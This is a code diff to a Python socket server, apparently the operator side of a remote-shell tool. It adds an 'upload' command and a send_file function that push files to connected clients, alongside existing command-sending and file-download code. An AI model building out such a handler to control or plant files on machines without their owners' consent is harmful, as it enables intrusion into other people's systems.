@@ -111,6 +111,32 @@ def receive_file(conn, filename):
         log_message(f"Error receiving file: {str(e)}", "ERROR")
         return False
 
+# Send file to client (for upload command)
+def send_file(conn, filename):
+    try:
+        if not os.path.isfile(filename):
+            log_message(f"File not found: {filename}", "ERROR")
+            return False
+        
+        file_size = os.path.getsize(filename)
+        conn.send(file_size.to_bytes(8, 'big'))
+        
+        with open(filename, 'rb') as f:
+            bytes_sent = 0
+            while bytes_sent < file_size:
+                chunk = f.read(4096)
+                if not chunk:
+                    break
+                conn.send(chunk)
+                bytes_sent += len(chunk)
+        
+        log_message(f"File uploaded: {filename} ({file_size} bytes)")
+        return True
+        
+    except Exception as e:
+        log_message(f"Error sending file: {str(e)}", "ERROR")
+        return False
+
 # Establish connection with a client
 def socket_accept():
     try:
@@ -152,6 +178,17 @@ def send_command(conn, address):
                     filename = cmd.split(" ", 1)[1].strip()
                     conn.send(str.encode(cmd))
                     receive_file(conn, filename)
+                    print(os.getcwd() + "> ", end="")
+                    continue
+                
+                if cmd.startswith("upload "):
+                    filename = cmd.split(" ", 1)[1].strip()
+                    if not os.path.isfile(filename):
+                        print(f"File not found: {filename}")
+                        print(os.getcwd() + "> ", end="")
+                        continue
+                    conn.send(str.encode(cmd))
+                    send_file(conn, filename)
                     print(os.getcwd() + "> ", end="")
                     continue
                 
